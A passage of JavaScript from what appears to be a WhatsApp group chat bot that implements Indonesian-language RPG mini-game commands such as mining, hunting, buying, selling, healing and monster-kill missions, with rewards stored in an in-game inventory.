 teksehmazeh += `🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n`
 teksehmazeh += `❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n`
 teksehmazeh += `🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n`
 teksehmazeh += `🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
await juna.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {  
title: botName, 
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'mining': case 'mine':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return newReply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await juna.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted: m})
}, 7000)
setTimeout( async () => {
await juna.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break
case 'beli': case 'buy':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!text) return newReply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( async() => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { 
 newReply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)}
 }
 break
case 'sell': case 'sel': case 'jual':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return newReply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return newReply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return newReply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
 newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return newReply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return newReply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return newReply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return newReply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return newReply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return newReply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return newReply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
newReply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }

 }
 break
case 'heal':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!isCekDarah < 1) return newReply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
if (isCekDarah > 100) return newReply('Darahmu Penuh')
if (isPotion < 1) return newReply(`Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 newReply('Done! Darah mu dah full')
 }
 break
case 'hunt': case 'hunting': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return newReply('Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan') 
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
 teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
await juna.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
juna.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
case 'adventure':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* $${money}\n ┊ *EXP :* ${adven}Xp`
juna.sendMessage(m.chat, {image:{url:hasm}, caption: hg},{quoted:m})

}, 7000)
setTimeout( () => {
newReply(`Awass`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
newReply(`Tiba-tiba Ada ${sesuatu}`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply(`${pushname} On an Adventure`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'ojek': case 'ngojek':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `
*—[ Hasil Ngojek ${pushname} ]—*
 ➕ 💹 Uang = [ ${money} ]
 ➕ ✨ Exp = [ ${adven} ]	 
 ➕ 😍 Order Selesai = +1
`
newReply(hg)

}, 10000)
setTimeout( () => {
newReply(`
➕ 💹Menerima gaji....
`)
}, 9000)
setTimeout( () => {
newReply(`
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Sampai di tujuan...
`)
}, 7000)
setTimeout( () => {
newReply(`
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Mengantar ke tujuan....
`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
newReply(`
Mendapatkan Orderan...
`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply(`Mencari Pelanggan...`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'luckyday':
case 'luckytime':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(m.sender, b, balance)
addLevelingXp(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
newReply(`🎰 *Lucky*\n┊ *Money:* $${b}\n┊ *Gold :* ${a}\n┊ *Iron :* ${c}\n┊ *XP :* ${ez}`)
}
break
case 'slime':
case 'killslime':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 400)
addLevelingXp(m.sender, ez)
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufutI = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
juna.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break
case 'goblin':
case 'killgoblin':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 500)
addLevelingXp(m.sender, ez)
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
juna.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break
case 'devil':
case 'killdevil':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 600)
addLevelingXp(m.sender, ez)
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
juna.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break
case 'behemoth':
case 'killbehemoth':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 700)
addLevelingXp(m.sender, ez)
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
juna.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break
case 'demon':
case 'killdemon':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 850)
addLevelingXp(m.sender, ez)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *Diamond:* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
juna.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break
case 'demonking':
case 'killdemonking':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 1000)
addLevelingXp(m.sender, ez)
addBalance(m.sender, 1999, balance)
addEmas(m.sender, 99)
addBesi(m.sender, 99)
addDm(m.sender, 99)
bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : $${b}\n ┊ *Iron :* ${c}\n ┊ *Gold :* ${a}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
juna.sendMessage(m.chat, {image:{url: bhuud}, caption: hg }, {quoted:m})
}
break
case 'joinrpg':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (isPetualang) return newReply(' *Kamu Telah join sebelumnya*')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
juna.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
case 'sellikan':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 5 * jmlh
if (getFish(m.sender) < jmlh) return newReply(`*Ikan Anda Tidak Cukup*`)
sellFish(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ *MARKET*\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Price/Fish : 5\n ┊ Status : Success\n ┊ Left FishPrice/Fish : ${await getFish(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellbesi':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 10 * jmlh
if (getBesi(m.sender) < jmlh) return newReply(`Besi Tidak Cukup`)
sellBesi(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Besi : 10\n ┊ Status : Sukses\n ┊ Sisa Besi : ${await getBesi(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellemas':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 25 * jmlh
if (getEmas(m.sender) < jmlh) return newReply(`Emas Anda Tidak Cukup`)
sellEmas(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Emas : 25\n ┊ Status : Sukses\n ┊ Sisa Emas : ${getEmas(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break 
case 'jelajah': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
addStone(m.sender, vio)
addIkan(m.sender, pikan)
juna.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) 

} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
addStone(m.sender, tesaaq)
addKayu(m.sender, ise)
juna.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 65)
addIkan(m.sender, feds)
juna.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
addOre(m.sender, fads)
addStone(m.sender, fids)
juna.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

